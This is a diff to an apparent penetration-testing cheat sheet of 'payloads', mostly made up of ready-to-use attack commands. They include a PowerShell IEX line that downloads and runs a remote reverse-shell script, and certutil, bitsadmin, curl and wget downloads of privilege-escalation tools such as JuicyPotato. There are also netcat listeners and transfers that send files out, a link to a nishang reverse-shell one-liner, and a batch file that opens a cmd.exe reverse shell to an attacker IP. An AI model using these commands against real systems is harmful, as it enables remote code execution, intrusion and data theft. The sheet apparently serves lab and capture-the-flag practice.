@@ -1,9 +1,9 @@
 # payloads
 
-## Downloading Files
+## Powershell Downloading Files
 
 ```
-#download and execute at the same time
+#Download and execute at the same time
 powershell.exe IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')
 
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.41:8000/JuicyPotato.exe','C:/Users/kohsuke/Desktop/JuicyPotato.exe')"
@@ -20,16 +20,37 @@ powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://
 
 powershell -c "$url = 'http://10.10.10.14:7898/file.exe'; $request = [System.Net.HttpWebRequest]::Create($url); $response = $request.GetResponse(); $stream = $response.GetResponseStream(); $output = [System.IO.File]::Create('file.exe'); $stream.CopyTo($output); $output.Close(); $response.Close()"
 
-certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
+```
+Powershell references : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
 
-sudo smbserver.py share .
+## Others File Transfer method
+
+### Downloading from Remote Host
+```
+certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
 
 copy \\10.10.14.14\share\churrasco.exe c.exe
 
-
 bitsadmin /transfer myDownload /priority normal http://10.10.14.3:8000/JuicyPotato.exe jp.exe
 
+curl -O http://10.10.15.14/example.exe
+ 
+wget http://10.10.15.14/example.exe
 
+```
+
+
+### Listeners on localhost
+```
+sudo smbserver.py share .
+
+nc -nvlp 1234
+
+python3 -m http.server
+
+```
+
+```
 nc -nv TARGET_IP 1234 < received_file
 
 nc -nlvp 1234 > file_to_send
@@ -43,14 +64,9 @@ On the sending end running,
 
 nc -w 3 [destination] 1234 < out.file
 
-curl
-
-wget
-
 scp example.txt user@192.168.1.100:/path/to/destination/
 
 scp user@192.168.1.100:/path/to/file.txt /path/on/local/machine/
-
 
 echo c:\Users\kohsuke\Desktop\nc.exe 10.10.14.41 4455 -e cmd.exe > reverse.bat
 ```
